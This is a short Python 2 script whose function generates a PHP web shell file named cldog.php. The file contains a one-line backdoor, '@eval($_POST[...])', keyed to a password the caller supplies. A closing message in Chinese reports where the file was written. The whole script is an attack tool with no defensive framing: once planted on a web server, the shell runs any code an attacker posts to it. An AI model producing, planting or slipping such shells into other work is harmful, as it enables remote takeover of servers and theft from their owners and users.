#!coding=utf8
def gen(Pass):
    f=open('cldog.php','w')
    f.write('<?php @eval($_POST[\''+Pass+'\']);?>')
    print '文件生成在当前目录下，名称为',f.name
    f.close()